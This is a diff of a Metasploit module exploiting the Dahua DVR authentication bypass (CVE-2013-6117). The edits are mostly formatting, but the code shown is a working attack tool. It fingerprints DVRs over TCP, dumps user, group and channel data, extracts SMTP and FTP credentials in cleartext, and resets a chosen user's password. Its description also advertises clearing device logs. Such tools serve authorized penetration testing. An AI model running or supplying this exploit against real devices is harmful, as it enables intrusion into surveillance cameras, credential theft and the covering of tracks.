@@ -1,3 +1,8 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
@@ -5,35 +10,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'            => %q(Dahua DVR Auth Bypass Scanner),
-      'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
-      'Author'          => [
+      'Name' => %q(Dahua DVR Auth Bypass Scanner),
+      'Description' => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
+      'Author' => [
         'Tyler Bennett - Talos Consulting', # Metasploit module
         'Jake Reynolds - Depth Security', # Vulnerability Discoverer
         'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
         'Nathan McBride' # regex extraordinaire
       ],
-      'References'      => [
+      'References' => [
         [ 'CVE', '2013-6117' ],
         [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
       ],
-      'License'         => MSF_LICENSE,
-      'DefaultAction'  => 'VERSION',
-      'Actions'        =>
-        [
-          [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],
-          [ 'DDNS', { 'Description' => 'Obtain the DDNS settings from the DVR' } ],
-          [ 'EMAIL', { 'Description' => 'Obtain the email settings from the DVR' } ],
-          [ 'GROUP', { 'Description' => 'Obtain the group information the DVR' } ],
-          [ 'NAS', { 'Description' => 'Obtain the NAS settings from the DVR' } ],
-          [ 'RESET', { 'Description' => 'Reset an existing user\'s password on the DVR' } ],
-          [ 'SERIAL', { 'Description' => 'Obtain the serial number from the DVR' } ],
-          [ 'USER', { 'Description' => 'Obtain the user information from the DVR' } ],
-          [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]
-        ]
+      'License' => MSF_LICENSE,
+      'DefaultAction' => 'VERSION',
+      'Actions' => [
+        [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],
+        [ 'DDNS', { 'Description' => 'Obtain the DDNS settings from the DVR' } ],
+        [ 'EMAIL', { 'Description' => 'Obtain the email settings from the DVR' } ],
+        [ 'GROUP', { 'Description' => 'Obtain the group information the DVR' } ],
+        [ 'NAS', { 'Description' => 'Obtain the NAS settings from the DVR' } ],
+        [ 'RESET', { 'Description' => 'Reset an existing user\'s password on the DVR' } ],
+        [ 'SERIAL', { 'Description' => 'Obtain the serial number from the DVR' } ],
+        [ 'USER', { 'Description' => 'Obtain the user information from the DVR' } ],
+        [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]
+      ]
     )
 
-    deregister_options('RHOST')
     register_options([
       OptString.new('USERNAME', [false, 'A username to reset', '888888']),
       OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
@@ -87,6 +90,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(VERSION)
     data = sock.get_once
     return unless data =~ /[\x00]{8,}([[:print:]]+)/
+
     ver = Regexp.last_match[1]
     print_good("#{peer} -- version: #{ver}")
   end
@@ -96,6 +100,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(SN)
     data = sock.get_once
     return unless data =~ /[\x00]{8,}([[:print:]]+)/
+
     serial = Regexp.last_match[1]
     print_good("#{peer} -- serial number: #{serial}")
   end
@@ -104,9 +109,11 @@ class MetasploitModule < Msf::Auxiliary
     connect
     sock.put(EMAIL)
     return unless (response = sock.get_once)
+
     data = response.split('&&')
     print_good("#{peer} -- Email Settings:")
     return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
+
     if mailhost = Regexp.last_match[1].split(':')
       print_status("#{peer} --  Server: #{mailhost[0]}") unless mailhost[0].blank?
       print_status("#{peer} --  Server Port: #{mailhost[1]}") unless mailhost[1].blank?
@@ -117,9 +124,11 @@ class MetasploitModule < Msf::Auxiliary
       mpass = "#{data[6]}"
     end
     return if muser.blank? && mpass.blank?
+
     print_good("  SMTP User: #{data[5]}")
     print_good("  SMTP Password: #{data[6]}")
     return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
+
     report_email_cred(mailserver, mailport, muser, mpass)
   end
 
@@ -127,6 +136,7 @@ class MetasploitModule < Msf::Auxiliary
     connect
     sock.put(DDNS)
     return unless (response = sock.get_once)
+
     data = response.split(/&&[0-1]&&/)
     ddns_table = Rex::Text::Table.new(
       'Header' => 'Dahua DDNS Settings',
@@ -135,6 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     data.each_with_index do |val, index|
       next if index == 0
+
       val = val.split("&&")
       ddns_service = val[0]
       ddns_server = val[1]
@@ -156,6 +167,7 @@ class MetasploitModule < Msf::Auxiliary
     connect
     sock.put(NAS)
     return unless (data = sock.get_once)
+
     print_good("#{peer} -- NAS Settings:")
     server = ''
     port = ''
@@ -177,7 +189,8 @@ class MetasploitModule < Msf::Auxiliary
           user: ftpuser,
           pass: ftppass,
           type: "FTP",
-          active: true)
+          active: true
+        )
       end
     end
   end
@@ -192,6 +205,7 @@ class MetasploitModule < Msf::Auxiliary
       'Columns' => ['ID', 'Peer', 'Channels']
     )
     return unless data.length > 1
+
     data.each_with_index do |val, index|
       number = index.to_s
       channels = val[/([[:print:]]+)/]
@@ -204,6 +218,7 @@ class MetasploitModule < Msf::Auxiliary
     connect
     sock.put(USERS)
     return unless (response = sock.get_once)
+
     data = response.split('&&')
     usercount = 0
     users_table = Rex::Text::Table.new(
@@ -236,6 +251,7 @@ class MetasploitModule < Msf::Auxiliary
     connect
     sock.put(GROUPS)
     return unless (response = sock.get_once)
+
     data = response.split('&&')
     groups_table = Rex::Text::Table.new(
       'Header' => 'Dahua groups',
@@ -265,6 +281,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.get_once
     sock.put(u1)
     return unless sock.get_once
+
     print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
   end
 
@@ -286,6 +303,7 @@ class MetasploitModule < Msf::Auxiliary
       data = sock.recv(8)
       disconnect
       return unless data == DVR_RESP
+
       print_good("#{peer} -- Dahua-based DVR found")
       report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
 
